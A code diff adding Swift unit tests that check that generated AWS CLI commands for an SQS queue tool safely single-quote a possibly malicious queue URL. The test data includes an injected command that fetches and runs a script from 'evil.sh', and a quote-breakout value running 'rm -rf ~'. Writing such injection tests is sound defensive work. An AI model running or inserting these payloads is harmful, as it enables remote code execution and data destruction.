@@ -205,4 +205,41 @@ struct SQSModelTests {
         let cli = msg.toAWSCLI(queueUrl: "http://localhost:4566/000/test", endpointUrl: "http://localhost:4566", region: "us-east-1")
         #expect(cli.contains("'\\''"))
     }
+
+    // MARK: - CLI Injection Safety (server-controlled queue URL)
+
+    // A malicious/compromised endpoint can return an arbitrary queue URL.
+    // It must be single-quoted so shell metacharacters stay inert when pasted.
+    private static let maliciousQueueUrl = "http://localhost:4566/000/q$(curl evil.sh|sh)"
+
+    @Test("sendMessageCLI single-quotes the queue URL")
+    func sendMessageCLIQuotesQueueUrl() {
+        let queue = SQSQueue(queueUrl: Self.maliciousQueueUrl)
+        let cli = queue.sendMessageCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--queue-url '\(Self.maliciousQueueUrl)'"))
+        #expect(!cli.contains("--queue-url \(Self.maliciousQueueUrl) "))
+    }
+
+    @Test("receiveMessageCLI single-quotes the queue URL")
+    func receiveMessageCLIQuotesQueueUrl() {
+        let queue = SQSQueue(queueUrl: Self.maliciousQueueUrl)
+        let cli = queue.receiveMessageCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--queue-url '\(Self.maliciousQueueUrl)'"))
+    }
+
+    @Test("getAttributesCLI single-quotes the queue URL")
+    func getAttributesCLIQuotesQueueUrl() {
+        let queue = SQSQueue(queueUrl: Self.maliciousQueueUrl)
+        let cli = queue.getAttributesCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--queue-url '\(Self.maliciousQueueUrl)'"))
+    }
+
+    @Test("toAWSCLI escapes single-quote breakout in queue URL")
+    func toAWSCLIQueueUrlBreakout() {
+        let msg = makeMessage(body: "hi")
+        let cli = msg.toAWSCLI(queueUrl: "http://x/q'; rm -rf ~; '", endpointUrl: "http://localhost:4566", region: "us-east-1")
+        // The lone closing quote must be neutralized as '\'' — no unescaped break.
+        #expect(cli.contains("'\\''"))
+        #expect(!cli.contains("--queue-url http://x/q'; rm"))
+    }
 }
